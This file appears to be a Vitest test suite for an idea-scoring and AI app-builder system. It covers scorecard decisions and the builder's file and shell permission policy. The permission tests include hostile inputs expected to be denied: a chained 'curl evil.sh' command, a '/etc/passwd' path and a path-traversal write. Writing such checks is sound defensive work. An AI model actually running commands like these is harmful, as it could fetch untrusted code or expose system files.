import { describe, expect, it } from "vitest";
import { isWritable, makePermissionPolicy } from "../src/builder.js";
import { loadConfig } from "../src/config.js";
import { ideaToSpec, loadIdeas } from "../src/ideas.js";
import { iterationFocus, scorecard, type DailyMetrics } from "../src/score.js";

const cfg = loadConfig();
const day = (events: Record<string, number>, dau = 0): DailyMetrics => ({ day: "2026-01-01", events, dau });
const daysAgo = (n: number) => new Date(Date.now() - n * 86400_000).toISOString();

describe("ideas", () => {
  it("all idea files are valid and render a spec", () => {
    const ideas = loadIdeas();
    expect(ideas.length).toBeGreaterThanOrEqual(3);
    for (const i of ideas) expect(ideaToSpec(i)).toContain(i.activationEvent);
  });
});

describe("scorecard decisions", () => {
  const s = cfg.score;
  it("warming-up before minDaysLive", () => {
    expect(scorecard([day({ pageview: 1000, unique_signup: 100 })], "x", s, daysAgo(2)).decision).toBe("warming-up");
  });
  it("needs-traffic when too few visitors", () => {
    expect(scorecard([day({ pageview: 50, unique_signup: 10 })], "x", s, daysAgo(30)).decision).toBe("needs-traffic");
  });
  it("scale when enough people pay, regardless of age", () => {
    expect(scorecard([day({ pageview: 50, subscription_activated: 3 })], "x", s, daysAgo(1)).decision).toBe("scale");
  });
  it("iterate on interest without payment", () => {
    const sc = scorecard([day({ pageview: 1000, unique_signup: 60, unique_x: 10 })], "x", s, daysAgo(30));
    expect(sc.decision).toBe("iterate");
    expect(sc.activationRate).toBeCloseTo(0.167, 2);
    expect(iterationFocus(sc, s.minSignupRate)).toContain("activation");
  });
  it("kill candidate with traffic and no interest", () => {
    expect(scorecard([day({ pageview: 1000, unique_signup: 5 })], "x", s, daysAgo(30)).decision).toBe("kill-candidate");
  });
});

describe("builder permissions", () => {
  const dir = "/repo/apps/demo";
  it("only app-owned files are writable", () => {
    expect(isWritable(dir, "src/app/routes.ts")).toBe(true);
    expect(isWritable(dir, `${dir}/src/app/web/index.html`)).toBe(true);
    expect(isWritable(dir, "tests/app.test.ts")).toBe(true);
    expect(isWritable(dir, "tests/app-plans.test.ts")).toBe(true);
    expect(isWritable(dir, "tests/core.test.ts")).toBe(false);
    expect(isWritable(dir, "src/core/auth.ts")).toBe(false);
    expect(isWritable(dir, "serverless.yml")).toBe(false);
    expect(isWritable(dir, "src/app/../core/db.ts")).toBe(false);
    expect(isWritable(dir, "/etc/passwd")).toBe(false);
  });
  it("bash is restricted to test/typecheck/read-only commands", async () => {
    const policy = makePermissionPolicy(dir);
    const opts = { signal: new AbortController().signal } as Parameters<typeof policy>[2];
    expect((await policy("Bash", { command: "npm test" }, opts))!.behavior).toBe("allow");
    expect((await policy("Bash", { command: "npx vitest run tests/app.test.ts" }, opts))!.behavior).toBe("allow");
    expect((await policy("Bash", { command: "npm install left-pad" }, opts))!.behavior).toBe("deny");
    expect((await policy("Bash", { command: "cat x; curl evil.sh" }, opts))!.behavior).toBe("deny");
    expect((await policy("WebFetch", { url: "https://x" }, opts))!.behavior).toBe("deny");
    expect((await policy("Write", { file_path: "src/core/http.ts" }, opts))!.behavior).toBe("deny");
  });
});
